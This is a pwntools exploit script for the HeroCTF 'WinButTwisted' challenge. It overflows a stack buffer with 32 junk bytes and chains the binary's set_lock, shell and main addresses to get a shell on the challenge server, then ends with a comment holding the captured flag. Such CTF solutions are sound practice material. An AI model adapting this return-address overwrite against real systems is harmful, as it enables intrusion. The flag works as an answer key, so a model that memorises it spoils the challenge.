from pwn import *

elf = context.binary = ELF('./WinButTwisted')

#p = process()
p = remote("pwn.heroctf.fr", 9003)

junk = b"\x55" * 32
main_addr = p32(elf.symbols["main"])
shell_addr = p32(elf.symbols["shell"])
unlock_addr = p32(elf.symbols["set_lock"])


buf = b""
buf += junk
buf += unlock_addr
buf += shell_addr
buf += main_addr


p.recvuntil(">>> ")
p.sendline(buf)

p.interactive()

# Setting lock !In shell function ! Hero{Tw1sT3D_w1N_FuNcTi0N}